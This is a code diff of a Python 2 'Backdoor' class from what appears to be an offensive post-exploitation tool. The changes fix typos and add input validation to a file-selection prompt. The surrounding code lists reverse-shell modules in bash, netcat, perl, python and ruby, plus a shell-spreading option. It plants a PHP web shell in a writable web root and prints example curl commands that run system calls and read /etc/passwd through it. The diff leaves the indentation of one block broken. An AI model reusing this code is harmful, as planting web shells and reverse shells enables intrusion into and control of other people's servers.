@@ -18,16 +18,16 @@ class Backdoor(object):
     def list(self):
         print '\n[i] Usage: @backdoor [module] <*ip:port>'
         print '[i] Modules:'
-        #print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions support this!)'
+        #print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions of bash support this!)'
         #print '[i] \t*java   \t\tUse java to create a reverse shell'
-        print '[i] \t*msf    \t\tUse a PHP metereter to create a reverse shell'
-        print '[i] \t*netcat \t\tUse netcat traditional to create a reverse shell (not netcat openbsd)'
+        print '[i] \t*msf    \t\tUse a linux metereter to create a reverse shell'
+        print '[i] \t*netcat \t\tUse netcat traditional to create a reverse shell (not netcat OpenBSD)'
         print '[i] \t*perl   \t\tUse perl to create a reverse shell'
         print '[i] \tphp    \t\t\tAttempt to write a PHP file into the web root directory'
         #print '[i] \t*php-cli    \t\tUse php-cli to create a reverse shell'
         print '[i] \t*python \t\tUse python to create a reverse shell'
         print '[i] \t*ruby   \t\tUse ruby to create a reverse shell'
-        print '[i] \tspread  \t\tSpread our shell around'
+        print '[i] \tspread  \t\tSpread this shell around'
         #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'
 
     # Redefinition on function "netcat"
@@ -124,11 +124,19 @@ class Backdoor(object):
                 c += 1
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, file, Colors.END)
 
+            while True:
+                try:
+                    clone=int(raw_input('{0}[>] Which file to use? [0-{1}]: {2}'.format(Colors.GREEN, c, Colors.END)))
+                    if 0 <= clone <= c:
+                        break
+                except ValueError:
+                    pass
 
-            clone=raw_input('{0}[>] Which file to use? [0-{1}]: {2}'.format(Colors.GREEN, c, Colors.END))
-            if clone is not "0":
-                cmd = 'cp -f {0} {1}'.format(path[int(clone)-1], location)
-                make_request.get_page_source(cmd)
+
+        if clone is not "0":
+            cmd = 'cp -f {0} {1}'.format(path[int(clone)-1], location)
+            make_request.get_page_source(cmd)
+
 
             print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, location, Colors.END)
             parameter = ''.join(random.choice(string.ascii_lowercase) for x in range(6))
@@ -146,7 +154,7 @@ class Backdoor(object):
             uri = folder[len(wwwroot):]
             print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)  # Need to add  http or https infront
         else:
-            print '\n{0}[!] Unable to find a wriable directory'.format(Colors.RED, Colors.END)
+            print '\n{0}[!] Unable to find a writable directory'.format(Colors.RED, Colors.END)
 
     def php_cli(self, ip, port):
         cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
